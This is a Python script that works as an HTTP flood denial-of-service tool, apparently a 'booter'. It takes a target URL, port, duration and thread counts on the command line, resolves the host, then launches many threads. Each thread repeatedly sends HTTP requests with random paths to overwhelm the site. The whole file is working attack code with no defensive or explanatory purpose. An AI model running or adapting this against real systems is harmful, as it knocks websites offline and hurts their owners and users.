import string,random,socket,threading,time,sys

def generate_url_path(num):
    data = "".join(random.sample(string.printable, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

status_code = False
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()

def RUNING_HTTP(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet,):
    for loader_num in range(create_thread):
        for _ in range(spam_create_thread):
            threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()

if len(sys.argv) == 10:
    data_type_loader_packet = sys.argv[1].upper()
    target_loader = str(sys.argv[2]).lower()
    port_loader = int(sys.argv[3])
    time_loader = time.time() + int(sys.argv[4])
    spam_loader = int(sys.argv[5])
    create_thread = int(sys.argv[6])
    booter_sent = int(sys.argv[7])
    methods_loader = sys.argv[8]
    spam_create_thread = int(sys.argv[9])
else:
    exit()

host = ''
ip = ''

try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
    code_leak = True
except socket.gaierror:
    code_leak = False
if code_leak == True:
    threading.Thread(target=RUNING_HTTP,args=(create_thread,spam_create_thread,ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
status_code = True